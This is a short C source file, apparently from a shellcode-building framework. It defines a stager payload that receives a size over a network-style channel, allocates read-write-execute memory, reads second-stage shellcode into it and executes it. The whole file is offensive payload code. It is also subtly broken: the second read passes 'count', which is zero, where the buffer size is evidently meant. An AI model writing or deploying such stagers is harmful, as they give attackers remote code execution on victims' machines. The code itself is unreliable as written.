#include <factory.h>

#include "helpers/channel.c"
#include "helpers/memory.c"

typedef __attribute__((noreturn)) void (* shellcode)(void);

SHELLCODE_ENTRY {

    Channel channel;
    unsigned short buffer_size = 0, count = 0;
    unsigned char *memory;

    /* Read the size of the input buffer (2 bytes). */
    channel.recv(&buffer_size, sizeof(buffer_size));
    memory = (unsigned char *) allocate_memory(buffer_size, PROT_READ|PROT_WRITE|PROT_EXEC);

    /* Read shellcode in memory. */
    channel.recv(memory, count);

    /* Execute shellcode. */
    ((shellcode) memory)();

} SHELLCODE_END
